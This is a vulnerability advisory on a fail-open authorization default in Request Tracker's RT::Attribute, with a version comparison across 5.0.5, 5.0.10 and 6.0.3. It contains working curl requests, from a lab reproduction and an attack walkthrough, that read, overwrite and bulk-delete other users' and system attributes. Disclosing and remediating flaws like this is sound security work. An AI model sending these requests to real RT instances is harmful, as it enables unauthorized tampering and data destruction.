# TTA-2026-017: Request Tracker 5.0.10 still affected by the `RT::Attribute` fail-open authorization default (follow-up to TTA-2026-004), and 6.0.3 remains fail-open by design

**Severity: High** — Suggested CVSS 3.1: 7.6 (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:L`) for 5.0.5 and 5.0.10

### Title

`RT::Attribute::LookupObjectRight` returns the literal string `allow` for any attribute name it does not know, so authorization for `RT::Attribute` objects depends on a map that covers one name in 5.x and zero names in 6.0.3. The 5.0.10 release still ships the vulnerable map and the vulnerable consumer unchanged.

### Summary

TTA-2026-004 described a fail-open in `RT::Attribute`: the class decides whether the current user may create, read, update or delete an attribute by consulting `$ACL_MAP` and `$PERSONAL_ACL_MAP`, and when a name is missing from those maps it returns `allow` rather than `deny`. In 5.0.5 the only mapped name is `SavedSearch`, so every other attribute type — `Dashboard`, `UserLogo`, `Subscription`, `DefaultDashboard`, and anything a plugin stores — is writable by any user who can reach a gadget that loads an attribute by id.

This report is a continuation of that advisory, not a new defect, and it exists to answer two questions the original report could not: is the problem fixed in the later 5.x release, and what is the state in the 6.x series?

The answers are:

- **5.0.10 is still vulnerable.** `lib/RT/Attribute.pm` in 5.0.10 is byte-identical to 5.0.5 in every relevant respect — same `$ACL_MAP` with `SavedSearch` as the only entry, same `$PERSONAL_ACL_MAP`, same three-way `allow`/`deny`/check branching in `Create`, `Delete`, `_Value` and `_Set`. The consumer that makes it reachable, `share/html/Widgets/SavedSearch`, is also unchanged: it still parses a container object out of `SavedSearchLoad` and then discards it, loading the `RT::Attribute` by bare numeric id.
- **6.0.3 still fails open at the `RT::Attribute` level, but the demonstrated consumer was refactored.** Both ACL maps are now literally empty (`our $ACL_MAP = {};`), so `LookupObjectRight` still answers `allow` for every name — the default has not been corrected, the map has simply been emptied. What changed is the caller: `Widgets/SavedSearch` now goes through `RT::SavedSearch`, whose `_CurrentUserCan` contains an explicit container check that refuses to load an attribute belonging to another user. The load path that TTA-2026-004 demonstrated is therefore closed in 6.0.3 by the wrapper, while the unsafe default that made it exploitable is still in place for any other caller.

No dynamic test was performed against 5.0.10 or 6.0.3. The claims for those versions are source-level and are stated as such.

### Affected Version

- Vendor: Best Practical Solutions, LLC
- Product: Request Tracker
- Confirmed affected version: 5.0.5 (dynamic reproduction, TTA-2026-004) and 5.0.10 (source-identical to 5.0.5 in all relevant code)
- Fail-open default still present: 6.0.3, with the demonstrated consumer path hardened
- Core components: `lib/RT/Attribute.pm`, `share/html/Widgets/SavedSearch`, `share/html/Search/Chart.html`, `share/html/Prefs/Search.html`
- Endpoint: `GET /Search/Chart.html?SavedSearchLoad=RT::<CLASS>-<OBJECT_ID>-SavedSearch-<ATTRIBUTE_ID>` with `SavedSearchSave=1` or `SavedSearchDelete=1`

Only RT 5.0.5 was dynamically tested. RT 5.0.10 and RT 6.0.3 were compared at the source level and were not executed; the claims for those versions are limited to what the source shows.

### Vulnerability Type

Missing authorization / fail-open default (CWE-862, CWE-636); broken object-level authorization (CWE-639); insecure direct object reference on a sequential primary key (CWE-639, CWE-1295).

### Affected Code

- `lib/RT/Attribute.pm` — `$ACL_MAP`, `$PERSONAL_ACL_MAP`, `LookupObjectRight`, `CurrentUserHasRight`, `Create`, `Delete`, `_Value`, `_Set`.
- `share/html/Widgets/SavedSearch` — `_parse_saved_search` and the `process` method that discards the parsed container.
- `share/html/Search/Chart.html` — the page that invokes the widget and dispatches `SavedSearchSave` / `SavedSearchDelete`.
- `share/html/Prefs/Search.html` — the read-side gadget (`?name=RT::Attribute-<id>`).

The authorization lookup, identical in 5.0.5 and 5.0.10:

```perl
our $ACL_MAP = {
    SavedSearch => {
        create  => 'EditSavedSearches',
        update  => 'EditSavedSearches',
        delete  => 'EditSavedSearches',
        display => 'ShowSavedSearches',
    },
};

our $PERSONAL_ACL_MAP = {
    SavedSearch => {
        create  => 'ModifySelf',
        update  => 'ModifySelf',
        delete  => 'ModifySelf',
        display => 'allow',
    },
};

sub LookupObjectRight {
    my $self = shift;
    my %args = @_;

    my $MAP = $ACL_MAP;
    if ( ($args{'ObjectType'} eq 'RT::User')
         && ($args{'ObjectId'} eq $self->CurrentUser->Id) ) {
        $MAP = $PERSONAL_ACL_MAP;
    }

    return ('allow') unless ( $MAP->{ $args{'Name'} } );
    return ('allow') unless ( $MAP->{ $args{'Name'} }->{ $args{'Right'} } );
    return ( $MAP->{ $args{'Name'} }->{ $args{'Right'} } );
}
```

The two `return ('allow')` lines are the defect. The POD states the behaviour plainly: *"Returns 'allow' if the right is otherwise unspecified."*

Every consumer treats `allow` as "skip the rights check":

```perl
# RT::Attribute::Create, 5.0.5 line 141 onward
my $object_right = $self->LookupObjectRight(
    Name    => $args{'Name'},
    Right   => 'create',
    ObjectType => ...,
    ObjectId   => ...,
);

if ($object_right eq 'deny') {
    return (0, $self->loc('Permission Denied'));
}
elsif ($object_right eq 'allow') {
    # do nothing, we're ok
}
elsif (!$self->CurrentUser->HasRight(Right => $object_right, Object => $self->Object)) {
    return (0, $self->loc('Permission Denied'));
}
```

6.0.3 differs only in the map contents:

```perl
our $ACL_MAP = {};
our $PERSONAL_ACL_MAP = {};
```

Both empty, so `LookupObjectRight` (6.0.3 line 85) returns `allow` for every name without even reaching the second `unless`.

### Root Cause

There are three layers, and it is worth separating them because only the first is a coding mistake and the other two are what turn it into an exploitable path.

**Layer 1 — a default that points the wrong way.** This is the layer TTA-2026-004 named. An authorization function that does not recognize an object type must refuse; this one permits. The comment in the POD shows the choice was deliberate, presumably so that plugins storing their own attribute types would keep working without registering a right. The consequence is that the safe behaviour belongs to the caller, and every new caller must remember to add its own check — which is exactly what the 6.0.3 refactor eventually did, and exactly what 5.x did not.

**Layer 2 — an identifier that is a bare primary key.** `RT::Attribute->Load($id)` accepts the `attributes` table's primary key. Nothing in the load path requires that the attribute belong to the current user, or to any object the current user can see. The `SavedSearchLoad` parameter has a structured, self-describing form (`RT::User-74-SavedSearch-20`), which means the caller *knows* which object the attribute is supposed to belong to — and the container id is attacker-controlled and never compared against the loaded row.

**Layer 3 — the consumer throws the container away.** This is the specific mistake that converts layer 1 plus layer 2 into a working exploit:

```perl
# share/html/Widgets/SavedSearch, 5.0.5 / 5.0.10 (identical)
if ( my ( $container_object, $search_id )
        = _parse_saved_search( $args->{'SavedSearchLoad'} || $args->{'SavedChartSearchId'} ) )
{
    my $search = RT::Attribute->new( $session{'CurrentUser'} );
    $search->Load( $search_id );            # <-- loaded by id, container ignored
    ...
    $self->{CurrentSearch}{Object} = $search;
    ...
    $args->{$_} = $search->SubValue($_) for ...;
}
```

`$container_object` is parsed and then never used. If the code had compared `$search->ObjectId` against `$container_object->id`, the attack would fail on the first request. If `LookupObjectRight` had returned `deny` for `Dashboard`, the `Create`/`Delete`/`_Set` gates would have stopped the write. Either check alone is sufficient; neither exists in 5.x.

**How the three layers combine into a request.** The following trace is the one observed in the lab; every id is from the recorded run.

```
GET /Search/Chart.html?SavedSearchLoad=RT::User-74-SavedSearch-20&SavedSearchSave=1&SavedSearchDescription=PWNED-DASH-346
  └─ Chart.html: my ($ok, $msg) = $widget->Process(...)
       └─ Widgets/SavedSearch::process
            ├─ _parse_saved_search('RT::User-74-SavedSearch-20')
            │     → (RT::User#74, 20)          # container parsed correctly
            ├─ RT::Attribute->new($CurrentUser)->Load(20)
            │     → attribute 20, ObjectType=RT::User, ObjectId=74   # container not compared
            ├─ $args{SavedSearchSave} → Content update path
            │     └─ RT::Attribute::_Set
            │          └─ CurrentUserHasRight('update')
            │               └─ LookupObjectRight(Name => 'Dashboard', Right => 'update')
            │                    └─ $ACL_MAP->{Dashboard} is undef → return 'allow'
            │                         └─ "do nothing, we're ok"
            └─ UPDATE attributes SET Content=..., Description=... WHERE id=20
```

The victim never appears in this trace except as a number in a query string.

**Why the ownership check that does exist does not help.** `RT::SharedSetting` does contain a container check, and the lab logs show it firing and being ignored:

```
[warning]: User #72 tried to load container user #74 (SharedSetting.pm:458)
[error]: Could not load object of type RT::User with ID 74, got object of type undef (SharedSetting.pm:421)
```

Both lines were written *during* a successful attack. The warning proves the code knew the container was not the attacker's; the request still completed. A check whose failure is logged and then bypassed is worse than no check, because it produces a false sense of coverage in the logs.

**Version matrix:**

| Version | `$ACL_MAP` contents | `LookupObjectRight` unknown name | `Widgets/SavedSearch` container check | Status |
| --- | --- | --- | --- | --- |
| 5.0.5 | `SavedSearch` only | `allow` | absent (container parsed and discarded) | exploitable (TTA-2026-004) |
| 5.0.10 | `SavedSearch` only, byte-identical to 5.0.5 | `allow` | absent, byte-identical consumer | exploitable by the same request |
| 6.0.3 | `{}` (empty) | `allow` | present in `RT::SavedSearch::_CurrentUserCan` | default unchanged; demonstrated path closed |

The 6.0.3 wrapper performs the check the 5.x consumer omitted:

```perl
# lib/RT/SavedSearch.pm, 6.0.3, sub _CurrentUserCan (line 386)
if ( $object->isa('RT::User') && $object->Id != $self->CurrentUser->Id ) {
    RT->Logger->warning("Permission denied: User #... does not have rights to load container user #...");
    return 0;
}
```

That is the correct shape of the check, and its existence in 6.0.3 is the reason this report does not claim 6.0.3 is exploitable by the same request. It is a fix at the call site, not at the default.

### How the defect was found

The original discovery (TTA-2026-004) began with a behavioural observation rather than a code reading: a low-privilege account was able to modify a dashboard it did not own, and the application log recorded an ownership warning at the same time as the write succeeded. That combination — "the platform printed a warning and then did the thing anyway" — pointed at a check whose failure path was not a refusal.

The follow-up work reported here was a version-scope question, answered by reading rather than running:

**Step 1 — locate the gate for each operation.** For each of create / read / update / delete, the code path from the HTTP handler down to the SQL statement was followed, and every branch that could return "allowed" without a `HasRight` call was listed. `LookupObjectRight` produced four of them (the two `unless` lines, times the two maps).

**Step 2 — enumerate the mapped names.** The map was printed and found to contain exactly one entry. The attribute names present in a running instance were then compared against it; `Dashboard`, `UserLogo`, `Subscription` and `DefaultDashboard` were all present in the database and all absent from the map.

**Step 3 — find a caller that accepts an id from the request.** `Widgets/SavedSearch` was identified because `SavedSearchLoad` is a client-supplied string that the widget itself decomposes into class, object id and attribute id — i.e. the widget is told the container, which is the strongest possible signal that a comparison was intended.

**Step 4 — confirm the container value is discarded.** Reading `process` showed `$container_object` bound and never referenced again. This is the single line that makes the finding a vulnerability rather than a hardening note.

**Step 5 — prove all three operations dynamically, with controls.** Read, update and delete were each executed against a synthetic victim in the lab, and each was paired with a control on the one mapped name (`SavedSearch`) which correctly refused. Recorded in `### Steps to Reproduce`.

**Step 6 — re-read the same code in 5.0.10 and 6.0.3.** Files were fetched from the three release tags and diffed; the 5.0.10 result was a no-op diff, the 6.0.3 result showed the emptied maps and the new wrapper.

### Laboratory environment

| Item | Value |
| --- | --- |
| Application | Request Tracker 5.0.5, distribution package |
| Web runtime | loopback port on the analyst workstation, referred to as `$RT_BASE` |
| Database | PostgreSQL container; database `rt5db`, role `rt5` |
| Attacker | `attacker346`, user id 72, `Privileged=1`, no administrative rights, no rights over the victim |
| Victim | `victim346`, user id 74, private dashboard and two private logos |
| Non-privileged control | `ss346`, user id 76, `Privileged=0` |
| Session handling | `curl` cookie jar `ck_att.txt` after a normal web login as `attacker346` |

The attacker account is deliberately an ordinary privileged user — the kind every RT deployment has dozens of — rather than an administrator, so that no result depends on administrative rights.

### Steps to Reproduce

Every value below was recorded during the run. Ids are from the lab database and are not meaningful outside it.

#### Phase 1 — inventory the victim's attributes

```sql
SELECT id, Name, ObjectType, ObjectId, Description, length(Content) AS len
FROM attributes
WHERE ObjectId IN (12, 74)
ORDER BY id;
```

Observed before the test:

```
18|SavedSearch|RT::User|74|victim346-private-search|142
20|Dashboard|RT::User|74|victim346-private-dashboard|90
22|UserLogo|RT::User|74|victim346 logo|21
26|UserLogo|RT::User|26|canary-victim-logo|21
27|UserLogo|RT::User|27|canary-victim-logo-UPD346|20
12|DefaultDashboard|RT::System|1|Default Dashboard|...
```

Row 18 (`SavedSearch`) is the negative control: it is the one name in `$ACL_MAP`, so it must stay protected. Row 12 is system-owned and is the strongest available target.

#### Phase 2 — read another user's attribute (read-side gadget)

```bash
curl -sS -b ck_att.txt "$RT_BASE/Prefs/Search.html?name=RT::Attribute-20" -o read.html
grep -c 'victim346-private-dashboard' read.html
```

Observed: the victim's private dashboard content rendered into the attacker's session. The same request with `name=RT::Attribute-18` (the mapped `SavedSearch`) is refused.

#### Phase 3 — update another user's dashboard

```bash
curl -sS -b ck_att.txt \
  "$RT_BASE/Search/Chart.html?SavedSearchLoad=RT%3A%3AUser-74-SavedSearch-20&SavedSearchSave=1&SavedSearchDescription=PWNED-DASH-346" \
  -o update.html
```

Observed: `HTTP 200`, body length 11285. Database afterwards:

```sql
SELECT id, Name, Description, length(Content) FROM attributes WHERE id = 20;
-- 20|Dashboard|PWNED-DASH-346|248
```

Description changed from `victim346-private-dashboard` to `PWNED-DASH-346`, and content grew from 90 bytes to 248 bytes — the attacker's payload replaced the victim's dashboard definition.

#### Phase 4 — delete another user's uploaded logo

```bash
curl -sS -b ck_att.txt \
  "$RT_BASE/Search/Chart.html?SavedSearchLoad=RT%3A%3AUser-74-SavedSearch-26&SavedSearchDelete=1" \
  -o delete.html
```

Observed: `HTTP 200`, body length 70522, response body contains the string `deleted.` inside the normal "Grouped search results" page. Then:

```sql
SELECT count(*) FROM attributes WHERE id = 26;   -- 0
```

The same request was repeated for id 22 (`victim346 logo`) with the same result.

#### Phase 5 — modify a system-level object

```bash
curl -sS -b ck_att.txt \
  "$RT_BASE/Search/Chart.html?SavedSearchLoad=RT%3A%3ASystem-1-SavedSearch-12&SavedSearchSave=1&SavedSearchDescription=PWNED-SYS-346" \
  -o system.html
```

Observed: row 12's description changed from `Default Dashboard` to `PWNED-SYS-346`. This is the system-wide default dashboard, i.e. the object every user without a personal dashboard sees. It was restored to its original value immediately after the check.

#### Phase 6 — controls

**(a) The mapped name refuses.** The same update and delete requests with `SavedSearchLoad=RT::User-74-SavedSearch-18` returned HTTP 200 but the row was unchanged / still present. This is the single most important control: the request shape is identical, only the attribute *name* differs, so the difference in outcome is attributable to `$ACL_MAP`.

**(b) A clean canary can be written.** A freshly created attribute (id 27) with a unique description was updated through the same URL:

```
before: 27|canary-victim-logo-UPD346|20
after:  27|PWNED-UPD-346|20            (HTTP 200, len=10846)
```

This rules out "the write path only works on objects that were already partially corrupted".

**(c) An unprivileged user cannot reach the page at all.**

```bash
curl -sS -b ck_ss.txt -D - "$RT_BASE/Search/Chart.html?SavedSearchLoad=RT%3A%3AUser-74-SavedSearch-20" -o /dev/null
```

Observed: `302` to `/SelfService/`. `Privileged=0` accounts are excluded from the search UI entirely, which bounds the attacker population to privileged users. It does not reduce the impact, because privileged users are exactly the population with access to tickets.

**(d) The warning is real and does not stop the request.** During phases 3–5 the application log recorded:

```
[warning]: User #72 tried to load container user #74 (SharedSetting.pm:458)
[error]: Could not load object of type RT::User with ID 74, got object of type undef (SharedSetting.pm:421)
```

Both messages were produced by the exploit requests themselves, and both requests completed successfully.

### Attack walkthrough

**1. Get any privileged RT account.** Self-registration is often enabled; otherwise a single compromised or purchased agent account is enough. No administrative right is needed.

**2. Enumerate attribute ids.** The `attributes` table primary key appears in a URL the attacker can already produce for their own searches (`/Prefs/Search.html?name=RT::Attribute-<own id>`), so the range in use is visible. Ids are sequential; walking a range costs one request each.

**3. Choose a target type.** `Dashboard` is the highest-value type in 5.x: its content is a JSON document describing a layout of RT portlets, so overwriting it changes what the victim sees and, in some portlet configurations, what the victim's browser loads. `UserLogo` is a clean integrity target. `DefaultDashboard` affects every user who has not personalised their home page.

**4. Write.** One GET per attribute. The response is an ordinary RT page, so nothing in the victim's session shows a warning, an interstitial, or a confirmation.

**5. Persist and observe.** The write is a database UPDATE; it survives restarts. `Dashboard` content is rendered on the victim's next visit to `/Dashboards/`, and the attacker's supplied content is stored, not reflected.

**6. Delete for denial of service.** `SavedSearchDelete=1` removes the row outright. Applied across a range of `UserLogo` or `Dashboard` ids it is a bulk wipe of user customisation, with no audit trail beyond the application log lines quoted above.

The read side is the same primitive in the other direction: `/Prefs/Search.html?name=RT::Attribute-<id>` renders another user's stored attribute value in the attacker's own session, which is a disclosure channel for whatever a plugin stores there.

### Impact

- **Integrity (high).** Any attribute row belonging to any user or to the system can be overwritten by any privileged user, without any right over the owning object. The value is attacker-controlled and persists.
- **Confidentiality (low to moderate).** The read gadget renders another user's attribute value; what leaks depends on which plugins store data in attributes. In the tested instance the victim's private dashboard definition was readable in full.
- **Availability (low).** Deletion is possible for the same id space, so user and system customisation can be destroyed wholesale.
- **Detection.** The only signal is an application-log warning that is emitted by the very requests that succeed, so an operator watching for that message sees an attack and a successful attack in the same line.

### CVSS

`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:L` — 7.6 High, for 5.0.5 and 5.0.10.

The score models an authenticated privileged user acting over the network with no user interaction, achieving high integrity impact on other users' stored objects, limited disclosure, and limited availability impact.

## Status

Published as TTA-2026-017 on 2026-10-28 as a follow-up to TTA-2026-004. The original advisory was privately reported to `security@bestpractical.com` on 2026-10-23 and published on 2026-10-24 with no vendor response; this follow-up corrects the version scope that the original could not determine. CVE eligibility is pending; no CVE has been assigned.

## Review decision (2026-10-29)

- **Technical status: confirmed in RT 5.0.5; source-supported recurrence in 5.0.10.** The 5.0.5 read, update, delete and system-object demonstrations, the `attacker346`/`victim346`/`ss346` controls, and the `90 -> 248` byte and deletion observations establish the defect. The 5.0.10 claim is based on byte-identical source and remains static until executed. In 6.0.3 the fail-open `RT::Attribute` default remains, but the demonstrated `Widgets/SavedSearch` path has a container check; do not generalise the 5.x exploit to that 6.0.3 path.
- **CVE status: do not request a new CVE as a standalone report.** This is a continuation and version-scope correction for TTA-2026-004. Send one private coordination report to Best Practical and ask the vendor/CNA to decide whether the two independently repairable causes (discarded container ownership and unknown-attribute `allow` default) belong under the existing record, an incomplete-fix update, or separate identifiers.
- **Required follow-up:** dynamically verify 5.0.10 if it is to remain in the confirmed scope, and inspect other 6.0.3 `RT::Attribute` consumers before making any claim beyond the demonstrated wrapper.
- **Deployment handling:** notify the school's RT owner for patching or compensating access controls, while keeping the CVE discussion with Best Practical/CNA.

## Prerequisites

- The attacker holds any `Privileged=1` RT account. No administrative right and no right over the victim object is required.
- The target attribute id is known or enumerated. Ids are sequential integers.
- For the 5.x path: the target attribute name is not `SavedSearch`, which is the only name present in `$ACL_MAP`.

## Relationship to existing CVEs

- This report is a **scope correction for TTA-2026-004**, not a separate vulnerability. TTA-2026-004 was published with 5.0.5 as the only confirmed version; the follow-up establishes that 5.0.10 carries byte-identical code and is equally affected, and that 6.0.3 retains the fail-open default while the demonstrated consumer path was hardened.
- No published CVE covers this defect. [CVE-2026-41074](https://www.cve.org/CVERecord?id=CVE-2026-41074) covers Referer-based CSRF, [CVE-2026-44231](https://www.cve.org/CVERecord?id=CVE-2026-44231) covers REST2 token exposure, [CVE-2026-41075](https://www.cve.org/CVERecord?id=CVE-2026-41075) covers REST2 query construction, and [CVE-2026-44229](https://www.cve.org/CVERecord?id=CVE-2026-44229) covers inline-served uploads. None of them touches `RT::Attribute`.

Whether the 5.0.10 recurrence should be filed as a new CVE, as an incomplete fix, or as a correction to TTA-2026-004's version range is for Best Practical or the assigning CNA to decide.

## Recommended remediation

- Change the default in `LookupObjectRight` from `allow` to `deny` for unknown names and rights, and require plugins to register their attribute types and rights explicitly.
- Add the container check at the load site rather than only at one wrapper: after `RT::Attribute->Load($id)`, compare `$self->ObjectType` and `$self->ObjectId` against the container parsed from the request, and refuse on mismatch.
- Apply the 6.0.3 `RT::SavedSearch::_CurrentUserCan` pattern to 5.0.x as a backport, since it is the single change that closes the demonstrated path.
- Populate `$ACL_MAP` for the attribute types shipped in core (`Dashboard`, `UserLogo`, `Subscription`, `DefaultDashboard`) so that the map is not the only thing standing between a plugin author and an open write primitive.
- Treat the existing `SharedSetting.pm` warning as an error: a failed container load must abort the request, not log and continue.

## Validation controls

| Case | Expected result |
| --- | --- |
| `SavedSearchLoad=RT::User-<OTHER>-SavedSearch-<ATTID>&SavedSearchSave=1` on a `Dashboard` row | Write succeeds before fix; must be refused after fix |
| Same request on a `SavedSearch` row (the mapped name) | Refused before and after fix |
| `SavedSearchLoad=RT::User-<OTHER>-SavedSearch-<ATTID>&SavedSearchDelete=1` | Row deleted before fix; must be refused after fix |
| `/Prefs/Search.html?name=RT::Attribute-<OTHER_ATTID>` | Renders other user's value before fix; must be refused after fix |
| Request from a `Privileged=0` account | `302` to `/SelfService/`, no attribute access |
| Container id in the URL replaced with the attacker's own id | Must still be refused after fix — the check must validate the loaded row, not the URL |

## Evidence boundary

The requests, responses, database states and log lines above were recorded on an isolated RT 5.0.5 laboratory instance with synthetic principals (`attacker346`, `victim346`, `ss346`) and synthetic attribute content. The system-level row that was modified during testing was restored to its original value. No customer hostname, IP address, credential, ticket content or production data is included. The 5.0.10 and 6.0.3 claims are source comparisons against the public upstream repository and were not executed; in particular, no claim is made that 6.0.3 can be exploited through `Widgets/SavedSearch`, because the wrapper that closes that path is present there.

## Timeline

- 2026-10-09: Read, update and delete of another user's `RT::Attribute` rows reproduced on an isolated RT 5.0.5 instance; system-level `DefaultDashboard` modified and restored; controls recorded. Published as TTA-2026-004 on 2026-10-24.
- 2026-10-28: `lib/RT/Attribute.pm` and `share/html/Widgets/SavedSearch` compared across 5.0.5, 5.0.10 and 6.0.3; 5.0.10 found byte-identical to 5.0.5, 6.0.3 found fail-open with an emptied map and a hardened wrapper. Published as TTA-2026-017.
